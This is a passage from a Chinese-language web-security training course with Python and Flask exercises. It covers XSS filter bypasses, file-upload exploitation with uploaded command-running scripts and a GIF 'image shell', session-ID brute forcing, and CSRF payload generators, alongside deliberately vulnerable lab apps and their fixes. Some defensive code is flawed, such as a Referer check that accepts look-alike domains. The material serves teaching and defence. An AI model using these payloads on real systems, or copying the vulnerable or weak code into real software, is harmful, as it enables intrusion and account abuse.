            <input type="submit" value="留言">
        </form>
        <hr>
    '''
    for c in comments:
        safe_c = html.escape(c)  # 输出转义
        html_content += f'<div>{safe_c}</div>\n'
    html_content += '</body></html>'

    response = make_response(render_template_string(html_content))
    # 也可通过HTTP头设置CSP
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response

if __name__ == '__main__':
    app.run(debug=True, port=5004)
讲解：
输出转义：html.escape(c)将HTML特殊字符转义，防止脚本注入。
CSP：通过Content-Security-Policy头限制脚本只能从同源加载，禁止内联脚本执行。
双重防御，即使转义失效（如富文本场景），CSP也能提供保护。
测试
提交恶意留言：<script>alert(1)</script>
页面显示为普通文本，不会弹窗。
若尝试内联脚本，CSP会阻止执行。

练习2-5：XSS过滤器绕过挑战
题目描述
面对一个简单的XSS过滤器（仅过滤<script>标签），尝试绕过。
漏洞代码（xss_filter_bypass.py）

"""
简单的XSS过滤器（仅替换<script>标签）
运行：python xss_filter_bypass.py
"""
from flask import Flask, request, render_template_string

app = Flask(__name__)

def filter_xss(input_str):
    # 简单过滤：删除<script>和</script>（不区分大小写？这里只处理小写）
    filtered = input_str.replace('<script>', '').replace('</script>', '')
    return filtered

@app.route('/search')
def search():
    q = request.args.get('q', '')
    safe_q = filter_xss(q)  # 应用过滤器
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>您搜索的内容：{safe_q}</h1>
    </body>
    </html>
    '''
    return render_template_string(html)

if __name__ == '__main__':
    app.run(debug=True, port=5005)
解：
过滤器仅删除<script>和</script>字符串，不处理其他标签或大小写变种。
绕过Payload（可成功）
大小写绕过：

<Script>alert(1)</Script>
过滤器只匹配小写，因此不会被删除。
嵌套标签绕过

<scr<script>ipt>alert(1)</scr</script>ipt>
过滤后变成<script>alert(1)</script>，仍可执行。
使用其他标签和事件：

<img src=x onerror=alert(1)>
完全绕过过滤器。
使用伪协议：

<a href="javascript:alert(1)">click</a>
使用编码：

&#60;script&#62;alert(1)&#60;/script&#62;
浏览器解析HTML实体后执行。
防御改进（完整转义）

"""
安全的过滤器：使用html.escape
"""
from flask import Flask, request, render_template_string
import html

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    safe_q = html.escape(q)  # 全面转义
    html_content = f'''
    <!DOCTYPE html>
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>您搜索的内容：{safe_q}</h1>
    </body>
    </html>
    '''
    return render_template_string(html_content)
讲解：
使用html.escape()将所有HTML特殊字符转义，彻底防止XSS。
不应依赖黑名单过滤，应使用白名单或转义。


第六课   文件上传漏洞原理与利用
1.1 文件上传漏洞概述
1.1.1 定义
文件上传漏洞是指Web应用允许用户上传文件，但未对上传文件进行充分检查（如文件类型、内容、大小），导致攻击者可以上传恶意脚本（如Python脚本、Shell脚本），进而控制服务器。
1.1.2 危害
获取服务器权限：上传可执行的Python脚本，执行任意系统命令。
内网横向移动：以Web服务器为跳板，攻击内网其他主机。
数据窃取：读取数据库配置文件、敏感文件。
网站篡改：上传恶意页面或重定向。
挂马：上传木马文件，感染访问者。
1.1.3 漏洞产生原因
缺少对上传文件类型的校验（仅依赖前端JS或MIME）。
未对文件内容进行检测（如图片马）。
未限制上传路径或文件名可被用户控制。
文件存储目录可执行脚本（如Python的import或exec）。
1.2 文件上传攻击流程（Python环境）
寻找上传点：用户头像、附件、简历、编辑器等。
尝试上传Python脚本：如.py文件，内容为恶意代码。
绕过检测：
修改文件扩展名（如.py改为.py.jpg）。
修改MIME类型（如application/octet-stream改为image/jpeg）。
使用%00截断（旧版本）。
双重扩展名（如shell.py.jpg）。
文件内容头部伪造（GIF89a）。
访问上传文件：获取路径，触发脚本执行（若服务器支持执行该类型文件或通过其他方式包含）。
1.3 常见绕过技术（Python视角）
1.3.1 前端验证绕过
前端JS限制文件类型，直接禁用JS或修改请求即可绕过。
1.3.2 服务端MIME类型验证绕过
修改请求中Content-Type字段为允许的类型。
1.3.3 扩展名黑名单绕过
大小写变换：.Py、.pY。
利用系统特性：.py3、.pyw（若黑名单不全面）。
双扩展名：shell.py.jpg。
特殊字符：shell.py.（Windows会忽略末尾点）。
1.3.4 内容验证绕过
图片马：在图片末尾插入Python代码。
使用GIF89a头部绕过图片检测。
在图像数据中加入代码（如exif信息）。
1.3.5 条件竞争
上传文件后，先保存到临时目录，再检查移动。攻击者可在检查前访问该文件。
1.4 防御措施（Python实现）
1.4.1 白名单验证
只允许安全类型（如jpg、png、pdf），使用白名单而非黑名单。
1.4.2 内容检测
使用imghdr或PIL检测图片真实性。
对非图片文件，使用文件头魔数验证。
使用反病毒软件扫描。
1.4.3 重命名文件
上传后使用随机字符串重命名，并保存到非Web目录（或限制执行权限）。
1.4.4 限制执行权限
上传目录设置不可执行Python脚本（如通过Nginx配置或Python路由限制）。
1.4.5 其他措施
限制文件大小。
使用单独的域名存储用户文件。
开启防病毒扫描。

第七课  代码审计发现文件上传漏洞
2.1 代码审计方法
2.1.1 审计流程
定位上传功能入口（Flask路由中的request.files）。
跟踪用户输入流。
检查验证逻辑（是否有白名单、是否可靠）。
检查文件存储方式（save方法路径拼接）。
检查文件访问权限（是否有执行风险）。
2.1.2 常见审计点
request.files相关处理。
文件读写函数（save、move_uploaded_file）。
拼接路径的变量是否可控。
是否存在exec、import、eval等执行用户上传文件内容。
2.1.3 工具辅助
静态分析工具（如Bandit、Pylint）。
代码搜索引擎（grep、ripgrep）。
2.2 典型漏洞代码分析（Python Flask）
2.2.1 仅前端验证

# 前端JS限制文件类型，后端无检查
@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    f.save(os.path.join(UPLOAD_DIR, f.filename))
    return '上传成功'
2.2.2 仅MIME验证

ALLOWED_MIMES = ['image/jpeg', 'image/png']
@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    if f.content_type in ALLOWED_MIMES:
        f.save(os.path.join(UPLOAD_DIR, f.filename))
        return '上传成功'
2.2.3 黑名单扩展名

BLACKLIST_EXTS = ['py', 'php', 'jsp']
ext = f.filename.rsplit('.', 1)[-1].lower()
if ext not in BLACKLIST_EXTS:
    f.save(os.path.join(UPLOAD_DIR, f.filename))
绕过：.py3、.pyw、.py.jpg。
2.2.4 内容检测不足

import imghdr
if imghdr.what(f) in ['jpeg', 'png', 'gif']:
    f.save(...)
可插入Python代码到图片末尾。
2.3 安全代码示例（Python）

import uuid
import imghdr

ALLOWED_EXTS = ['jpg', 'png', 'pdf']

@app.route('/upload', methods=['POST'])
def safe_upload():
    f = request.files['file']
    # 检查扩展名（白名单）
    ext = f.filename.rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTS:
        return '不允许的扩展名', 400
    # 检查真实内容（图片或PDF）
    if ext in ['jpg', 'png', 'gif']:
        if not imghdr.what(f):
            return '不是真实图片', 400
    # 生成随机文件名
    new_name = str(uuid.uuid4()) + '.' + ext
    f.save(os.path.join(UPLOAD_DIR, new_name))
    # 记录到数据库
    return '上传成功'


代码演练（5个Python练习）
练习1：基础文件上传漏洞环境搭建与复现（Python）
目标：搭建一个存在文件上传漏洞的Flask应用，上传Python恶意脚本并通过访问执行。
漏洞代码（upload_vuln.py）

from flask import Flask, request, render_template_string
import os
import subprocess

app = Flask(__name__)
UPLOAD_DIR = './uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route('/')
def index():
    return '''
    <h2>文件上传（漏洞版）</h2>
    <form method="post" action="/upload" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit">
    </form>
    '''

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    if f:
        filename = f.filename
        f.save(os.path.join(UPLOAD_DIR, filename))
        return f'上传成功！路径: /uploads/{filename}'
    return '上传失败'

# 模拟执行上传的Python文件（危险！仅用于演示）
@app.route('/exec/<path:filename>')
def execute(filename):
    filepath = os.path.join(UPLOAD_DIR, filename)
    if os.path.exists(filepath):
        try:
            result = subprocess.check_output(['python', filepath], stderr=subprocess.STDOUT)
            return f'<pre>{result.decode()}</pre>'
        except subprocess.CalledProcessError as e:
            return f'执行错误: {e.output.decode()}'
    return '文件不存在'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
攻击步骤
创建恶意Python脚本 shell.py：

# shell.py
import os
os.system('whoami > /tmp/result.txt')
print('OK')
上传该文件。
访问 http://127.0.0.1:5000/exec/shell.py，触发执行。
查看执行结果（打印OK或查看/tmp/result.txt内容）。
预期结果：服务器执行了上传的Python脚本。

练习2：MIME类型验证绕过（Python）
目标：修改上传请求中的Content-Type，绕过MIME白名单验证。
漏洞代码（upload_mime.py）

from flask import Flask, request
import os

app = Flask(__name__)
UPLOAD_DIR = './uploads'
ALLOWED_MIMES = ['image/jpeg', 'image/png']

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    if f and f.content_type in ALLOWED_MIMES:
        filename = f.filename
        f.save(os.path.join(UPLOAD_DIR, filename))
        return '上传成功'
    return '文件类型不允许'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
绕过方法
使用Python脚本发送请求，将Content-Type伪造为image/jpeg。

import requests

url = 'http://127.0.0.1:5000/upload'
files = {
    'file': ('shell.py', 'import os; os.system("whoami")', 'image/jpeg')
}
r = requests.post(url, files=files)
print(r.text)
预期结果：打印"上传成功"，服务器保存了shell.py文件。

练习3：扩展名黑名单绕过（Python）
目标：利用黑名单不完整的漏洞，使用未被过滤的扩展名上传恶意脚本。
漏洞代码（upload_blacklist.py）

from flask import Flask, request
import os

app = Flask(__name__)
UPLOAD_DIR = './uploads'
BLACKLIST_EXTS = ['py', 'php', 'jsp', 'asp']

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    ext = f.filename.rsplit('.', 1)[-1].lower()
    if ext not in BLACKLIST_EXTS:
        f.save(os.path.join(UPLOAD_DIR, f.filename))
        return '上传成功'
    return '禁止的扩展名'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
绕过方法
使用py3、pyw等扩展名，或双扩展名（如shell.py.jpg）。

import requests

url = 'http://127.0.0.1:5000/upload'
# 使用未在黑名单中的扩展名 .pyw
files = {'file': ('shell.pyw', 'import os; os.system("whoami")')}
r = requests.post(url, files=files)
print(r.text)
预期结果：上传成功，文件保存为shell.pyw。在Windows中，.pyw也可被Python执行。

练习4：图片马上传与利用（Python）
目标：创建图片马（在图片中嵌入Python代码），绕过内容检测。
生成图片马（create_img_shell.py）

# 生成一个GIF图片马
with open('shell.gif', 'wb') as f:
    f.write(b'GIF89a\x00\x00\x00\x00')
    f.write(b'# -*- coding: utf-8 -*-\n')
    f.write(b'import os\n')
    f.write(b'os.system("whoami")\n')
漏洞代码（upload_image_check.py）

from flask import Flask, request
import os
import imghdr

app = Flask(__name__)
UPLOAD_DIR = './uploads'

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    # 使用imghdr检测图片类型
    if imghdr.what(f) in ['gif', 'jpeg', 'png']:
        f.save(os.path.join(UPLOAD_DIR, f.filename))
        return '上传成功'
    return '不是图片'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
绕过
上传shell.gif，imghdr检测为gif，通过检查。服务器保存后，可利用文件包含或直接访问（若该目录允许执行Python，但通常不执行）。真实利用需要结合其他漏洞（如Python的import或exec）。这里演示图片马存在，但需额外漏洞触发执行。
预期结果：上传成功，服务器保存了包含Python代码的GIF文件。

练习5：代码审计与修复（Python）
目标：审计给定的代码，找出漏洞并修复。
审计代码（upload_for_audit.py）

import os
import re
from flask import Flask, request

app = Flask(__name__)
UPLOAD_DIR = './uploads'
ALLOWED_EXTS = ['jpg', 'png', 'gif']

def is_image(content):
    # 仅检查文件头
    return content.startswith(b'\xff\xd8') or content.startswith(b'\x89PNG') or content.startswith(b'GIF')

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    filename = f.filename
    # 获取扩展名
    ext = filename.rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTS:
        return '不允许的扩展名'
    content = f.read()
    if not is_image(content):
        return '文件内容不是图片'
    # 保存
    new_name = re.sub(r'[^a-zA-Z0-9.]', '', filename)  # 危险：过滤不严
    f.seek(0)
    f.save(os.path.join(UPLOAD_DIR, new_name))
    return '上传成功'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
漏洞点
re.sub(r'[^a-zA-Z0-9.]', '', filename)：允许点，可以保留双扩展名（如shell.py.jpg）。
is_image只检查开头，可制作图片马。
未限制文件名长度，可能造成目录遍历。
修复代码

import os
import uuid
import imghdr
from flask import Flask, request

app = Flask(__name__)
UPLOAD_DIR = './uploads'
ALLOWED_EXTS = ['jpg', 'png', 'gif']

@app.route('/upload', methods=['POST'])
def safe_upload():
    f = request.files['file']
    # 使用imghdr检测真实图片类型
    img_type = imghdr.what(f)
    if img_type not in ALLOWED_EXTS:
        return '文件不是允许的图片类型', 400
    # 生成随机文件名
    new_name = str(uuid.uuid4()) + '.' + img_type
    f.save(os.path.join(UPLOAD_DIR, new_name))
    return '上传成功'
讲解：修复方案包括：使用可靠图片检测库、随机重命名、白名单扩展名、禁止双扩展名。

课程总结与思考
重点回顾
文件上传漏洞危害巨大，根本原因在于未对用户上传文件进行充分校验。
绕过技术多样，防御必须多层（文件类型、内容、存储路径、执行权限）。
代码审计是发现漏洞的有效手段，应重点关注上传逻辑和路径拼接。
课后任务
搭建DVWA靶场，完成文件上传模块（Low→High难度），尝试用Python脚本自动化测试。
使用Python编写一个简单的文件上传扫描器，检测目标网站是否存在漏洞。
阅读OWASP文件上传防御手册，总结最佳实践。




Web安全与应急响应 Python实战课程体系
二十节完整课程大纲与代码练习



复习课0611

第1课：HTTP协议基础与请求伪造

前置知识：无
下一课衔接：第2课的Cookie与Session机制

知识点
HTTP请求/响应结构
请求方法（GET/POST/PUT/DELETE）
状态码含义
请求头伪造（User-Agent、Referer、X-Forwarded-For）

代码练习1：HTTP请求构造器

"""
http_request_builder.py
功能：构造并发送自定义HTTP请求，理解协议结构
"""

import socket
import requests
import json

class HTTPRequestBuilder:
    """HTTP请求构造器"""
    
    def __init__(self):
        self.session = requests.Session()
        self.custom_headers = {}
    
    def build_raw_request(self, method, host, path, headers=None, body=None):
        """构造原始HTTP请求字符串"""
        request_line = f"{method} {path} HTTP/1.1\r\n"
        default_headers = {
            'Host': host,
            'User-Agent': 'Python-HttpBuilder/1.0',
            'Accept': '*/*',
            'Connection': 'close'
        }
        if headers:
            default_headers.update(headers)
        
        header_str = ''.join([f"{k}: {v}\r\n" for k, v in default_headers.items()])
        request = request_line + header_str + "\r\n"
        if body:
            request += body
        return request
    
    def send_raw_request(self, host, port, request):
        """使用socket发送原始请求"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.send(request.encode())
            response = sock.recv(4096).decode()
            sock.close()
            return response
        except Exception as e:
            return f"Error: {e}"
    
    def forge_ip(self, target_url, fake_ip):
        """伪造X-Forwarded-For头"""
        headers = {'X-Forwarded-For': fake_ip}
        try:
            response = self.session.get(target_url, headers=headers)
            return response.text
        except Exception as e:
            return str(e)
    
    def detect_methods(self, target_url):
        """探测服务器支持的HTTP方法"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE', 'PATCH']
        supported = []
        for method in methods:
            try:
                req = requests.Request(method, target_url)
                prepared = req.prepare()
                # 使用session发送
                response = self.session.send(prepared, verify=False)
                if response.status_code not in [405, 501, 400]:
                    supported.append(method)
            except:
                pass
        return supported
    
    def test_referer_bypass(self, target_url, allowed_domain):
        """测试Referer绕过"""
        headers = {'Referer': allowed_domain}
        response = self.session.get(target_url, headers=headers)
        return response.status_code, response.text[:200]

class HTTPServerSimulator:
    """模拟HTTP服务器，用于测试"""
    
    def __init__(self):
        self.handlers = {}
    
    def start_simple_server(self, port=8080):
        """启动简单的HTTP服务器"""
        import http.server
        import socketserver
        
        class CustomHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                print(f"[{self.address_string()}] {format % args}")
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                # 打印请求头用于分析
                headers = '\n'.join([f"{k}: {v}" for k, v in self.headers.items()])
                self.wfile.write(f"Request Headers:\n{headers}".encode())
        
        with socketserver.TCPServer(("", port), CustomHandler) as httpd:
            print(f"Server running on port {port}")
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\nServer stopped")

if __name__ == "__main__":
    builder = HTTPRequestBuilder()
    
    # 练习1：构建并发送GET请求
    print("="*50)
    print("练习1：构建原始GET请求")
    request = builder.build_raw_request('GET', 'httpbin.org', '/get')
    print(f"原始请求:\n{request}")
    response = builder.send_raw_request('httpbin.org', 80, request)
    print(f"响应:\n{response[:300]}...")
    
    # 练习2：伪造IP头
    print("\n" + "="*50)
    print("练习2：伪造X-Forwarded-For头")
    result = builder.forge_ip('https://httpbin.org/headers', '1.2.3.4')
    print(f"伪造IP后的响应: {result[:200]}...")
    
    # 练习3：探测HTTP方法
    print("\n" + "="*50)
    print("练习3：探测支持的HTTP方法")
    supported = builder.detect_methods('https://httpbin.org/get')
    print(f"支持的方法: {supported}")
    
    # 练习4：Referer绕过测试
    print("\n" + "="*50)
    print("练习4：Referer伪造测试")
    status, content = builder.test_referer_bypass('https://httpbin.org/headers', 'https://trusted.com')
    print(f"状态码: {status}")

讲解要点：
HTTP协议是Web安全的基础，理解原始请求结构有助于分析漏洞
请求头可被伪造，不应仅依赖请求头做安全判断
危险方法（PUT、DELETE）未禁用可能导致任意文件操作

课后任务：编写脚本扫描目标站点的HTTP方法，识别危险方法。



第2课：Cookie、Session与会话管理

前置知识：第1课（HTTP协议）
下一课衔接：第3课（CSRF攻击）

知识点
Cookie的属性（HttpOnly、Secure、SameSite）
Session机制与存储
会话劫持与固定
Cookie安全性分析

代码练习2：会话管理器

"""
session_manager.py
功能：管理Cookie和Session，演示会话安全
"""

import requests
import hashlib
import time
import uuid
import json
from flask import Flask, request, make_response, session
from collections import defaultdict

class SessionManager:
    """会话管理分析器"""
    
    def __init__(self):
        self.session = requests.Session()
    
    def analyze_cookie_attributes(self, url):
        """分析Cookie的安全属性"""
        try:
            response = self.session.get(url)
            cookies = response.cookies
            analysis = []
            for cookie in cookies:
                info = {
                    'name': cookie.name,
                    'value': cookie.value[:20] + '...' if len(cookie.value) > 20 else cookie.value,
                    'secure': cookie.secure,
                    'http_only': cookie.has_nonstandard_attr('HttpOnly'),
                    'same_site': cookie.get_nonstandard_attr('SameSite', 'Not Set'),
                    'domain': cookie.domain,
                    'path': cookie.path
                }
                analysis.append(info)
            return analysis
        except Exception as e:
            return str(e)
    
    def predict_session_id(self, generator_type='sequential'):
        """演示可预测Session ID的风险"""
        if generator_type == 'sequential':
            return [f"SESSION_{i}" for i in range(10000)]
        elif generator_type == 'timestamp':
            return [str(int(time.time() + i)) for i in range(-100, 100)]
        elif generator_type == 'weak_hash':
            return [hashlib.md5(f"user_{i}".encode()).hexdigest()[:16] for i in range(100)]
        return []
    
    def session_fixation_attack(self, target_url, victim_session_id):
        """演示Session固定攻击"""
        # 攻击者设置一个Session ID给受害者
        cookies = {'sessionid': victim_session_id}
        # 诱导受害者登录（实际需要配合社工）
        response = self.session.get(target_url, cookies=cookies)
        return response.status_code
    
    def brute_force_session(self, target_url, session_generator):
        """暴力破解Session ID"""
        for sid in session_generator:
            cookies = {'sessionid': sid}
            response = self.session.get(target_url, cookies=cookies)
            if response.status_code == 200 and 'dashboard' in response.text.lower():
                return sid
        return None

class VulnerableSessionApp:
    """存在会话安全问题的Flask应用"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.app.secret_key = 'weak_secret_key_123'  # 弱密钥
        self.users = {'admin': 'admin123', 'alice': 'pass123'}
        self.sessions = defaultdict(dict)
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return '''
            <h2>会话管理演示</h2>
            <a href="/login">登录</a> | 
            <a href="/profile">个人资料</a> | 
            <a href="/admin">管理员</a>
            '''
        
        @self.app.route('/login', methods=['GET', 'POST'])
        def login():
            if request.method == 'POST':
                username = request.form.get('username')
                password = request.form.get('password')
                
                if username in self.users and self.users[username] == password:
                    resp = make_response('登录成功！')
                    # 漏洞1：Session ID可预测
                    session_id = hashlib.md5(f"{username}_{int(time.time())}".encode()).hexdigest()
                    # 漏洞2：未设置HttpOnly和Secure
                    resp.set_cookie('sessionid', session_id)
                    # 漏洞3：Session信息存储在Cookie中（可被解密）
                    user_data = {'username': username, 'role': 'user' if username != 'admin' else 'admin'}
                    resp.set_cookie('user_data', json.dumps(user_data))
                    return resp
                return '登录失败'
            return '''
            <form method="post">
                用户名: <input name="username"><br>
                密码: <input type="password" name="password"><br>
                <input type="submit" value="登录">
            </form>
            '''
        
        @self.app.route('/profile')
        def profile():
            # 从Cookie读取用户信息（不安全）
            user_data = request.cookies.get('user_data')
            if user_data:
                try:
                    data = json.loads(user_data)
                    return f'欢迎 {data.get("username")}，角色: {data.get("role")}'
                except:
                    pass
            return '请先登录'
        
        @self.app.route('/admin')
        def admin():
            user_data = request.cookies.get('user_data')
            if user_data:
                data = json.loads(user_data)
                if data.get('role') == 'admin':
                    return '管理员面板：敏感操作'
            return '权限不足'
    
    def run(self, port=5000):
        self.app.run(debug=True, port=port)

class SecureSessionManager:
    """安全的会话管理实现"""
    
    @staticmethod
    def create_secure_session():
        """创建安全的Session"""
        # 生成真随机Session ID
        session_id = str(uuid.uuid4())
        return session_id
    
    @staticmethod
    def create_secure_cookie(name, value, secure=True, http_only=True, same_site='Strict'):
        """创建安全的Cookie设置"""
        cookie_attrs = {
            'name': name,
            'value': value,
            'secure': secure,
            'httponly': http_only,
            'samesite': same_site
        }
        return cookie_attrs
    
    @staticmethod
    def validate_session(session_data, server_session_store):
        """验证Session有效性"""
        if not session_data or session_data not in server_session_store:
            return False
        # 检查Session是否过期
        if time.time() - server_session_store[session_data]['created'] > 3600:
            return False
        return True

if __name__ == "__main__":
    # 练习1：分析Cookie属性
    print("="*50)
    print("练习1：分析Cookie安全属性")
    manager = SessionManager()
    
    # 启动漏洞应用（需要在新终端运行）
    import threading
    app = VulnerableSessionApp()
    thread = threading.Thread(target=app.run, args=(5001,))
    thread.daemon = True
    thread.start()
    time.sleep(2)
    
    # 分析Cookie
    analysis = manager.analyze_cookie_attributes('http://127.0.0.1:5001/login')
    print("Cookie分析结果:")
    for cookie in analysis:
        print(f"  {cookie}")
    
    # 练习2：Session ID预测
    print("\n" + "="*50)
    print("练习2：Session ID可预测性演示")
    predictable_ids = manager.predict_session_id('sequential')
    print(f"可预测的Session ID示例: {predictable_ids[:5]}...")
    
    # 练习3：Cookie篡改
    print("\n" + "="*50)
    print("练习3：Cookie篡改攻击演示")
    print("漏洞：用户角色存储在可修改的Cookie中")
    print("攻击者可以将user_data中的role从user改为admin")
    
    # 练习4：安全Cookie设置
    print("\n" + "="*50)
    print("练习4：安全Cookie配置")
    secure_cookie = SecureSessionManager.create_secure_cookie('secure_session', str(uuid.uuid4()))
    print(f"安全Cookie配置: {secure_cookie}")

讲解要点：
Cookie的HttpOnly和Secure属性可提高安全性
Session ID必须足够随机、不可预测
用户状态不应存储在可被用户修改的Cookie中
登录后应重新生成Session ID防止固定攻击

课后任务：分析常见网站的Cookie属性，评估安全性。



第3课：CSRF攻击实战

前置知识：第1课（HTTP协议）、第2课（Cookie机制）
下一课衔接：第4课（XSS攻击）

知识点
CSRF攻击原理
GET型CSRF
POST型CSRF
CSRF Token防御
SameSite防御

代码练习3：CSRF攻击与防御

"""
csrf_demo.py
功能：CSRF攻击演示与防御实现
"""

import requests
import secrets
import hashlib
import time
from flask import Flask, request, make_response, session, render_template_string
from urllib.parse import urlparse

class CSRFAutoSubmitter:
    """CSRF攻击自动化工具"""
    
    def __init__(self):
        self.session = requests.Session()
    
    def generate_get_payload(self, target_url, params):
        """生成GET型CSRF的img标签"""
        param_str = '&'.join([f"{k}={v}" for k, v in params.items()])
        full_url = f"{target_url}?{param_str}"
        payload = f'<img src="{full_url}" style="display:none">'
        return payload
    
    def generate_post_form(self, target_url, params):
        """生成POST型CSRF的表单"""
        inputs = '\n'.join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in params.items()])
        payload = f'''
        <form id="csrf" action="{target_url}" method="POST">
            {inputs}
        </form>
        <script>document.getElementById('csrf').submit();</script>
        '''
        return payload
    
    def generate_auto_xhr(self, target_url, params, method='POST'):
        """生成使用XMLHttpRequest的CSRF"""
        param_str = ','.join([f'"{k}":"{v}"' for k, v in params.items()])
        payload = f'''
        <script>
            var xhr = new XMLHttpRequest();
            xhr.open("{method}", "{target_url}", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send({ { {param_str} } });
        </script>
        '''
        return payload
    
    def check_csrf_token(self, target_url):
        """检测是否存在CSRF Token"""
        try:
            response = self.session.get(target_url)
            # 检查页面中是否有csrf_token
            if 'csrf_token' in response.text or 'csrfToken' in response.text:
                return True
            return False
        except:
            return False

class BankTransferVulnerable:
    """存在CSRF漏洞的银行转账应用"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.users = {
            'alice': {'password': '123456', 'balance': 5000, 'token': None},
            'bob': {'password': '123456', 'balance': 3000, 'token': None},
            'attacker': {'password': 'attacker', 'balance': 100}
        }
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            user_id = request.cookies.get('user_id')
            if not user_id:
                return '请先<a href="/login">登录</a>'
            balance = self.users.get(user_id, {}).get('balance', 0)
            return f'''
            <h2>欢迎 {user_id}</h2>
            <p>余额: ${balance}</p>
            <h3>转账（漏洞版）</h3>
            <form action="/transfer" method="GET">
                收款人: <input name="to"><br>
                金额: <input name="amount"><br>
                <input type="submit" value="转账">
            </form>
            <a href="/transfer_safe">安全转账</a>
            '''
        
        @self.app.route('/login', methods=['GET', 'POST'])
        def login():
            if request.method == 'POST':
                username = request.form.get('username')
                password = request.form.get('password')
                if username in self.users and self.users[username]['password'] == password:
                    resp = make_response('登录成功！<a href="/">返回首页</a>')
                    resp.set_cookie('user_id', username)
                    return resp
                return '登录失败'
            return '''
            <form method="post">
                用户名: <input name="username"><br>
                密码: <input type="password" name="password"><br>
                <input type="submit" value="登录">
            </form>
            '''
        
        @self.app.route('/transfer')
        def transfer_get():
            """GET方式转账 - CSRF漏洞点"""
            user_id = request.cookies.get('user_id')
            if not user_id:
                return '请先登录'
            
            to_user = request.args.get('to', '')
            amount = int(request.args.get('amount', 0))
            
            if user_id not in self.users:
                return '用户不存在'
            if self.users[user_id]['balance'] < amount:
                return '余额不足'
            
            self.users[user_id]['balance'] -= amount
            if to_user not in self.users:
                self.users[to_user] = {'balance': 0, 'password': ''}
            self.users[to_user]['balance'] += amount
            
            return f'转账成功！向 {to_user} 转账 ${amount}'
        
        @self.app.route('/transfer_safe', methods=['GET', 'POST'])
        def transfer_safe():
            """安全的转账 - 使用CSRF Token"""
            user_id = request.cookies.get('user_id')
            if not user_id:
                return '请先登录'
            
            if request.method == 'GET':
                # 生成CSRF Token
                token = secrets.token_hex(16)
                session['csrf_token'] = token
                return render_template_string('''
                <h3>安全转账</h3>
                <form method="post">
                    <input type="hidden" name="csrf_token" value="{{ token }}">
                    收款人: <input name="to"><br>
                    金额: <input name="amount"><br>
                    <input type="submit" value="转账">
                </form>
                <a href="/">返回</a>
                ''', token=token)
            else:
                # 验证Token
                token = request.form.get('csrf_token')
                if not token or token != session.get('csrf_token'):
                    return 'CSRF攻击检测！', 403
                
                to_user = request.form.get('to')
                amount = int(request.form.get('amount', 0))
                # 转账逻辑...
                return '转账成功'
    
    def run(self, port=5000):
        self.app.run(debug=True, port=port)

class CSRFDefenseDemo:
    """CSRF防御方案演示"""
    
    @staticmethod
    def double_submit_cookie():
        """双重Cookie提交防御"""
        import hashlib
        import secrets
        
        # 生成Token
        token = secrets.token_hex(16)
        # 同时设置在Cookie和表单中
        cookie_token = hashlib.sha256(token.encode()).hexdigest()
        return {'cookie': cookie_token, 'form': token}
    
    @staticmethod
    def validate_referer(referer, trusted_domain):
        """Referer验证"""
        if not referer:
            return False
        parsed = urlparse(referer)
        return parsed.netloc.endswith(trusted_domain)
    
    @staticmethod
    def use_samesite_cookie():
        """设置SameSite Cookie"""
        cookie_settings = {
            'samesite': 'Strict',
            'secure': True,
            'httponly': True
        }
        return cookie_settings

if __name__ == "__main__":
    # 练习1：生成CSRF攻击Payload
    print("="*50)
    print("练习1：生成CSRF攻击Payload")
    attacker = CSRFAutoSubmitter()
    
    # GET型CSRF
    get_payload = attacker.generate_get_payload('http://bank.com/transfer', 
                                                  {'to': 'attacker', 'amount': '1000'})
    print("GET型CSRF Payload:")
    print(get_payload)
    
    # POST型CSRF
    post_payload = attacker.generate_post_form('http://bank.com/transfer',
                                                 {'to': 'attacker', 'amount': '1000'})
    print("\nPOST型CSRF Payload:")
    print(post_payload[:200] + "...")
    
    # 练习2：检测CSRF Token
    print("\n" + "="*50)
    print("练习2：检测CSRF Token存在性")
    
    # 启动漏洞应用
    import threading
    bank_app = BankTransferVulnerable()
    thread = threading.Thread(target=bank_app.run, args=(5002,))
    thread.daemon = True
    thread.start()
    time.sleep(2)
    
    has_token = attacker.check_csrf_token('http://127.0.0.1:5002/transfer_safe')
    print(f"安全页面是否存在CSRF Token: {has_token}")
    
    # 练习3：防御方案实现
    print("\n" + "="*50)
    print("练习3：CSRF防御方案")
    defense = CSRFDefenseDemo()
    
    # 双重Cookie提交
    double_cookie = defense.double_submit_cookie()
    print(f"双重Cookie方案: Cookie Token={double_cookie['cookie'][:16]}..., Form Token={double_cookie['form'][:16]}...")
    
    # Referer验证
